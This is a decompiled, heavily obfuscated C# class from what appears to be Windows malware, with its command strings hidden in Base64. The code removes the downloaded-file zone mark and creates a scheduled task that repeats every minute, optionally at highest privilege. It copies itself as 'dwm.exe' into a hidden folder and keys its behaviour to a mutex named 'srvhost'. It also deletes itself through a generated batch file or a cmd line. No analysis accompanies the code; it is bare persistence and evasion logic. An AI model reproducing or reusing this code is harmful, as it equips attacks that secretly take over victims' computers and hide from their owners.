using System;
using System.IO;
using System.Management;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal class H
{
	private static string 俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮MR9DIwpG4YFjRNWollm2tRAg6俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮 = new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name;

	private static Mutex 俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮mtNgTOXZt6i7K8gGmeFChMLhY俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮;

	public static string 俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮zrNaizHOhdvtI4I13ZEN7k4ng俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮
	{
		get
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_0046: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				ManagementObjectCollection obj = new ManagementObjectSearcher(Encoding.UTF8.GetString(Convert.FromBase64String("U2VsZWN0IFByb2Nlc3NvcklkIEZyb20gV2luMzJfcHJvY2Vzc29y"))).Get();
				string result = Encoding.UTF8.GetString(Convert.FromBase64String(""));
				ManagementObjectEnumerator enumerator = obj.GetEnumerator();
				try
				{
					if (enumerator.MoveNext())
					{
						result = ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item(Encoding.UTF8.GetString(Convert.FromBase64String("UHJvY2Vzc29ySWQ="))).ToString();
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				return result;
			}
			catch
			{
				return Encoding.UTF8.GetString(Convert.FromBase64String("V2luZG93cyBVcGRhdGU="));
			}
		}
	}

	public static void lziVmuRs7VCb0LJiUXheRaMFVGdudo(string A)
	{
		string text = null;
		J.bVRaQDElrHRWbRs8Si8fdGnMeEt9sH(string.Format(Encoding.UTF8.GetString(Convert.FromBase64String("ezB9OlpvbmUuSWRlbnRpZmllcg==")), A));
		J.K4tjqr2Q3FznFgWtAQjz3xJ9JtdZIT(D: (!K.俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮4qQzc7RpovIbh437mjYJLS1ov俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮) ? (Encoding.UTF8.GetString(Convert.FromBase64String("L2NyZWF0ZSAvdG4gIg==")) + 俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮zrNaizHOhdvtI4I13ZEN7k4ng俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮 + Encoding.UTF8.GetString(Convert.FromBase64String("IiAvdHIgIg==")) + A + Encoding.UTF8.GetString(Convert.FromBase64String("IiAvc3Qg")) + DateTime.Now.AddMinutes(1.0).ToString(Encoding.UTF8.GetString(Convert.FromBase64String("SEg6bW0="))) + Encoding.UTF8.GetString(Convert.FromBase64String("IC9kdSA5OTk5OjU5IC9zYyBkYWlseSAvcmkgMSAvZg=="))) : (Encoding.UTF8.GetString(Convert.FromBase64String("L2NyZWF0ZSAvdG4gIg==")) + 俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮zrNaizHOhdvtI4I13ZEN7k4ng俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮 + Encoding.UTF8.GetString(Convert.FromBase64String("IiAvdHIgIg==")) + A + Encoding.UTF8.GetString(Convert.FromBase64String("IiAvc3Qg")) + DateTime.Now.AddMinutes(1.0).ToString(Encoding.UTF8.GetString(Convert.FromBase64String("SEg6bW0="))) + Encoding.UTF8.GetString(Convert.FromBase64String("IC9kdSA5OTk5OjU5IC9zYyBkYWlseSAvcmkgMSAvZiAvUkwgSElHSEVTVA=="))), A: 0, B: Encoding.UTF8.GetString(Convert.FromBase64String("b3Blbg==")), C: Encoding.UTF8.GetString(Convert.FromBase64String("c2NodGFza3MuZXhl")), E: null, F: 0);
		g3c1NlPa8PtgfhSKPFhZk0tzmSASFn();
	}

	public static void QWPjlUFIduDQRFNcxz0qkKyT0lN2KX(string A)
	{
		try
		{
			if (!Directory.Exists(A))
			{
				_2CD0VEZu1UYNpAQH7Zp5NnMJwFYvSA(A);
			}
			A += Encoding.UTF8.GetString(Convert.FromBase64String("ZHdtLmV4ZQ=="));
			if (File.Exists(A))
			{
				File.Delete(A);
			}
			new FileInfo(俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮MR9DIwpG4YFjRNWollm2tRAg6俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮).CopyTo(A, overwrite: true);
		}
		catch
		{
		}
	}

	public static void _2CD0VEZu1UYNpAQH7Zp5NnMJwFYvSA(string A)
	{
		Directory.CreateDirectory(A).Attributes = FileAttributes.Hidden | FileAttributes.Directory;
	}

	public static void GdyP2BNqkIMC7G16VxCTNocfKfqu4P()
	{
		try
		{
			string text = new Random().Next(10000, 99999) + Encoding.UTF8.GetString(Convert.FromBase64String("LmJhdA=="));
			File.AppendAllText(text, Encoding.UTF8.GetString(Convert.FromBase64String("cGluZyAtbiAxIC13IDUwMDAgMC4wLjAuMCA+bnVsCmRlbCAi")) + Path.GetFileName(Application.get_ExecutablePath()) + Encoding.UTF8.GetString(Convert.FromBase64String("IgplcmFzZSAlMA==")));
			J.K4tjqr2Q3FznFgWtAQjz3xJ9JtdZIT(0, Encoding.UTF8.GetString(Convert.FromBase64String("b3Blbg==")), text, null, null, 0);
		}
		catch
		{
			J.K4tjqr2Q3FznFgWtAQjz3xJ9JtdZIT(0, Encoding.UTF8.GetString(Convert.FromBase64String("b3Blbg==")), Encoding.UTF8.GetString(Convert.FromBase64String("Y21k")), Encoding.UTF8.GetString(Convert.FromBase64String("L2MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsICI=")) + 俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮MR9DIwpG4YFjRNWollm2tRAg6俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮 + Encoding.UTF8.GetString(Convert.FromBase64String("Ig==")), null, 0);
		}
	}

	public static void g3c1NlPa8PtgfhSKPFhZk0tzmSASFn()
	{
		while (true)
		{
			if (!LTW51i0GsgQlZnZ6JvWz0kME4Pacev())
			{
				GdyP2BNqkIMC7G16VxCTNocfKfqu4P();
				Environment.Exit(0);
			}
			Thread.Sleep(3000);
		}
	}

	public static bool LTW51i0GsgQlZnZ6JvWz0kME4Pacev()
	{
		try
		{
			俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮mtNgTOXZt6i7K8gGmeFChMLhY俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮 = Mutex.OpenExisting(Encoding.UTF8.GetString(Convert.FromBase64String("c3J2aG9zdA==")));
			俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮mtNgTOXZt6i7K8gGmeFChMLhY俺ム仮_0020ｎｏ_3000ｓｌｅｅｐ_3000俺ム仮.Close();
			return false;
		}
		catch
		{
			return true;
		}
	}
}
